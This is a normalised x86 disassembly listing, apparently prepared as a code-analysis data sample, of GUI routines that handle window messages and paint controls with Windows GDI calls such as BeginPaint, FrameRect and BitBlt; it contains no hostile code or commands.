je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_4556f4
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx eax
cmp edx 0x100
jge r-xdata
cmp edx 0xb047
jg r-xdata
cmp edx 0x1f
jg r-xdata
sub edx 0xb04a
je r-xdata
je r-xdata
sub edx 0x21
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
test al al
je r-xdata
sub edx 0x4
jne r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_43bd90
mov ebx eax
test ebx ebx
je r-xdata
add edx 0xffffff00
sub edx 0xa
jb r-xdata
mov edx [ ebp - 0x8 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_4554f4
test al al
je r-xdata
sub edx 0x63
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4585f8
mov ebx eax
call GetCapture
cmp ebx eax
jne r-xdata
sub edx 0x7
je r-xdata
xor eax eax
push ebp
push sub_455be1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
test al al
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_459998
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_451c28
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x128
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4510c0
test al al
jne r-xdata
add edx 0xffffff0a
sub edx 0xb
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_451c28
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0xffffffff
jne r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_43bd90
mov ebx eax
test ebx ebx
je r-xdata
dec edx
je r-xdata
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_459998
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x80 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0xb047
mov eax ebx
call sub_451b4c
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
cmp eax 0x200
jne r-xdata
sub edx 0x98
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_458904
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
movsx eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
movsx eax [ ebp - 0x12 ]
mov [ ebp - 0x18 ] eax
push 0x0
push 0x0
lea ecx [ ebp - 0x34 ]
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4503d4
lea edx [ ebp - 0x34 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_455430
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
jmp r-xdata
push r-xdata
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push 0x77
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call SetWindowPos
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_455640
test al al
je r-xdata
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0xa ]
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x8 ]
call sub_418420
lea edx [ ebp - 0x34 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_450324
call sub_44d640
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x238 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
test eax eax
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_451c28
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_451b4c
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov ebx [ rw-data ]
lea eax [ ebp - 0x10 ]
mov dl 0x1
call sub_44ee0c
mov ebx eax
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebp - 0x4 ]
call sub_451b4c
push 0x0
xor ecx ecx
mov edx 0xb014
call sub_451b4c
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_458904
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x238 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x23c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0x23c ]
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x23c ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call DefWindowProcA
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x238 ] 0x1
mov [ ebp - 0x2c ] 0x10
mov [ ebp - 0x28 ] 0x2
mov eax [ ebp - 0x4 ]
call sub_4585f8
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] 0xffffffff
lea eax [ ebp - 0x2c ]
push eax
call _TrackMouseEvent
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ rw-data ]
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
xor ecx ecx
mov edx 0xb014
call sub_451b4c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x23c ]
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov [ edx + 0x23c ] eax
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
call sub_4202d8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x23c ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
call sub_420098
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ rw-data ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
xor ecx ecx
mov edx 0xb013
call sub_451b4c
sub_455c14
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x1b4 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_451ef8
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_451b4c
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_424230
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x1a4 ]
call sub_424fb0
call sub_424230
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x1a4 ]
call sub_424fec
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_450430
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x1b4 ]
push eax
mov eax [ esi + 0x1a8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_455d1c
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_44d2f4
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_451b4c
mov [ esi + 0xc ] eax
mov bl 0x1
sub_455d50
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_455eaf
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1cc ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call BeginPaint
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_455e72
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edi 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1cc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc4 ]
jmp r-xdata
dec edi
je r-xdata
inc ebx
xor esi esi
xor ecx ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_455ee8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455eb6
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call EndPaint
inc esi
dec ebx
jne r-xdata
test [ eax + 0x55 ] 0x8
jne r-xdata
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x55 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1cc ]
mov edx esi
call sub_419898
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov ecx [ eax + 0x44 ]
add ecx [ eax + 0x4c ]
push ecx
mov edx [ eax + 0x40 ]
mov ecx edx
add ecx [ eax + 0x48 ]
push ecx
mov ecx [ eax + 0x44 ]
push ecx
push edx
mov eax [ ebp - 0x10 ]
push eax
call ExcludeClipRect
mov edi eax
cmp edi 0x1
je r-xdata
sub_455ee8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1dc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1cc ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1db ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
test eax eax
je r-xdata
xor edx edx
mov [ ebp - 0xc ] edx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b0 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1cc ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov edx ebx
call sub_4198f4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b0 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1cc ]
mov edx [ ebp - 0xc ]
call sub_419898
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
inc [ ebp - 0xc ]
dec edi
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
mov edx [ ebp - 0xc ]
call sub_419898
mov ebx eax
cmp [ ebx + 0x1d9 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jl r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x55 ] 0x8
jne r-xdata
mov eax [ ebp - 0x18 ]
mov esi [ eax + 0x44 ]
mov eax esi
mov edx [ ebp - 0x18 ]
add eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x18 ]
mov ebx [ eax + 0x40 ]
mov ecx ebx
mov eax [ ebp - 0x18 ]
add ecx [ eax + 0x48 ]
mov edx esi
mov eax ebx
call sub_418448
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RectVisible
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x55 ] 0x8
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_424230
push eax
call CreateSolidBrush
mov esi eax
push esi
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_418448
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FrameRect
push esi
call DeleteObject
mov eax 0xff000014
call sub_424230
push eax
call CreateSolidBrush
mov esi eax
push esi
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_418448
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FrameRect
push esi
call DeleteObject
mov eax [ ebp - 0x8 ]
push eax
call SaveDC
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_456095
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x44 ]
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x8 ]
call sub_44eea0
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx 0xf
mov eax [ ebp - 0x18 ]
call sub_451b4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RestoreDC
retn
mov eax [ ebp - 0x18 ]
or [ eax + 0x54 ] 0x80
test [ ebx + 0x55 ] 0x8
jne r-xdata
sub_4561c8
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45625e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
sub eax 0x2
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
push eax
call ExcludeClipRect
call sub_432228
lea ecx [ ebp - 0x18 ]
mov dl 0x2
call sub_432498
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call sub_432228
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
call sub_4323ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456265
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call RestoreDC
retn
sub_456278
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x80
mov eax [ ebp - 0x8 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4564b1
push [ fs : edx ]
mov [ fs : edx ] esp
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_44eea0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
xor esi esi
xor ebx ebx
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov ebx 0xa
mov esi 0x200f
jmp r-xdata
cmp ebx 0xa
jne r-xdata
mov ebx 0x3
mov esi 0xa00f
test esi esi
je r-xdata
call sub_432228
call sub_432330
test al al
je r-xdata
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx 0x14
mov eax [ ebp - 0x4 ]
call sub_451b4c
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx 0xf
mov eax [ ebp - 0x4 ]
call sub_451b4c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call SetRect
push esi
push ebx
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call DrawEdge
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_44eea0
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4564b8
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RestoreDC
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call SetRect
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4321d0
test al al
jne r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
or eax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x50 ] eax
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_4561c8
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
not edx
and edx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x50 ] edx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_4561c8
jmp r-xdata
inc esi
dec ebx
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx [ ebp - 0x8 ]
call sub_456278
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_44eea0
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
mov edx esi
call sub_419898
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_4564d0
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x240 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x1
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_455d50
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4546e8
test eax eax
jne r-xdata
call sub_42fb10
test al al
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call BeginPaint
mov esi eax
mov eax [ ebp - 0x3c ]
sub eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
push eax
push esi
call CreateCompatibleBitmap
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_4566f2
push [ fs : ecx ]
mov [ fs : ecx ] esp
push esi
call CreateCompatibleDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor ecx ecx
push ebp
push sub_4566b9
push [ fs : ecx ]
mov [ fs : ecx ] esp
push 0x0
mov eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWindowOrgEx
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx 0x14
mov eax [ ebp - 0x4 ]
call sub_451b4c
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4564d0
xor eax eax
mov [ ebx + 0x4 ] eax
push 0xcc0020
mov edx [ ebp - 0x44 ]
push edx
mov eax [ ebp - 0x48 ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x3c ]
sub ecx edx
push ecx
mov ecx [ ebp - 0x40 ]
sub ecx eax
push ecx
push edx
push eax
push esi
call BitBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4566c0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call BeginPaint
mov esi eax
xor eax eax
push ebp
push sub_4565d6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x48 ]
mov ecx 0x2
mov eax esi
call sub_42eed4
mov ebx eax
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx 0x14
mov eax [ ebp - 0x4 ]
call sub_451b4c
push 0x4
mov ecx [ ebp - 0x8 ]
mov edx 0x318
mov eax [ ebp - 0x4 ]
call sub_451b4c
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4047dc
test al al
jne r-xdata
or edx 0xffffffff
mov eax ebx
call sub_42ef60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call EndPaint
retn
lea edx [ ebp - 0x48 ]
mov cl 0xff
mov eax ebx
call sub_42efcc
sub_4566c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call EndPaint
mov eax [ ebp - 0x8 ]
push eax
call DeleteDC
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_456700
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_455d1c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_456720
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_455d1c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_456794
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_455d1c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4567b4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_455d1c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4567d4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x8 ]
call sub_455d1c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
